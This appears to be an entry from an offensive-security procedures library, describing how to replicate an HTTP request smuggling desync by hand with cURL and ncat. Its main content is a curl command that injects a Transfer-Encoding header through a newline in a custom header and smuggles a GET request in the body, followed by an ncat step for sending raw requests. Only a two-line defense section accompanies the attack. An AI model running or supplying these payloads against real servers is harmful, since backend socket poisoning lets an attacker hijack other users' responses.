---
tags:
  - http-request-smuggling
  - manual-exploit
type: procedure
tools:
  - '[[tools/cURL]]'
  - '[[tools/ncat]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 035dd903-733a-4f11-84db-b02f9f0ec283
created_at: '2025-12-13T09:01:21.992Z'
updated_at: '2025-12-13T09:01:21.992Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Manual Replication of HTTP Desync with cURL and ncat

## Summary

This procedure manually replicates the HTTP Request Smuggling desync using command-line tools like cURL or ncat to send crafted requests without scripting.

## Description

By manually constructing and sending requests with \n headers and chunked bodies, the desync can be triggered directly, mimicking the automated script for verification or in environments without Turbo Intruder.

## Requirements

1. cURL or ncat installed
2. Direct access to port 443 on the target
3. Knowledge of the exact payload from the script

## Defense

Defensive measures and detection strategies:

- Use WAF to block malformed HTTP requests
- Monitor network traffic for unusual header formats

## Objectives

1. Manually poison the backend socket
2. Verify desync without tools
3. Achieve similar response hijacking

## Instructions

### Step 1: Send Desync Request with cURL

**Context**: Craft and send the request to exploit desync.

**Command**:
```bash
curl --path-as-is --insecure -H "Host: stage.█████" -H "Fooz: bar\nTransfer-Encoding: chunked" -H "Content-Length: 77" --data "220\n24GET███████ HTTP/1.1\nX: X\n" "https://██████████/████"
```

> This sends a POST with smuggled GET, poisoning the socket.

### Step 2: Use ncat for Raw Sending

**Context**: For more control, use ncat to send raw HTTP.

**Command**:
```bash
ncat --ssl ██████████ 443
```

> Then paste the raw request payload into the connection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used

- [[tools/cURL]]
- [[tools/ncat]]

## Tags

- manual-exploit
- desync
